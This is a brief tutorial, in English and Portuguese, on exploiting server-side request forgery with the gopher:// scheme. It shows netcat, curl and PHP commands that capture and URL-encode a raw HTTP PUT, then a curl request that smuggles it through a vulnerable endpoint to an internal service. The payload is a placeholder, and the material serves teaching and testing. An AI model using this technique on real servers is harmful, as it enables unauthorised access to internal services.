Server-side request forgery ias a web security vulnerability that allows an attacker to cause the server-side application to make request to an unintended location.
***
## Gopher 
Gopher é um protocolo criado para a busca e recuperação de documentos em texto plano pela internet. Em um cenário onde requisições HTTP são restritas e há o suporte ao protocolo Gopher podemos utiliza-lo para fazer requisições HTTP.
#### Gerando a requisição
Iremos simular o servidor que queremos atacar localmente para gerarmos a requisição. Então começamos a escutar na porta onde o serviço vulnerável está rodando, encodamos em base64 para não perdemos nenhum byte e jogamos em um arquivo.
```sh 
$ nc -lvp 8000 | base64 -w0 > request.txt
```
Agora fazemos a requisição da forma que queremos que ela seja executada no servidor vulnerável, no **Path** e com os **Headers** que queremos.
```sh
 $ curl http://localhost:8000/v1/agent/check -X PUT -H 'Content-Type: application/json' -d '{"test":"test"}' -H 'Connection: close'
```
#### Payload
Após recuperar a requisição encodada, vamos usar um decode base64 e encodar em **URL**.
```sh
$ php -r "echo urlencode('$(base64 -d request.txt)');"
PUT+%2Fv1%2Fagent%2Fcheck+HTTP%2F1.1%0D%0AHost%3A+localhost%3A8000%0D%0AUser-Agent%3A+curl%2F8.15.0%0D%0AAccept%3A+%2A%2F%2A%0D%0AContent-Type%3A+application%2Fjson%0D%0AConnection%3A+close%0D%0AContent-Length%3A+15%0D%0A%0D%0A%7B%22test%22%3A%22test%22%7D
```
Após gerar nossa payload podemos utiliza-la na aplicação vulnerável. Temos que colocar a payload após um **\_**, pois é assim que o **gopher** faz.
```sh
$ curl -X PUT http://10.0.30.0/api/list -d '{"url":"gopher://localhost:8000/_PUT+%2Fv1%2Fagent%2Fcheck+HTTP%2F1.1%0D%0AHost%3A+localhost%3A8000%0D%0AUser-Agent%3A+curl%2F8.15.0%0D%0AAccept%3A+%2A%2F%2A%0D%0AContent-Type%3A+application%2Fjson%0D%0AConnection%3A+close%0D%0AContent-Length%3A+15%0D%0A%0D%0A%7B%22test%22%3A%22test%22%7D"}'
```
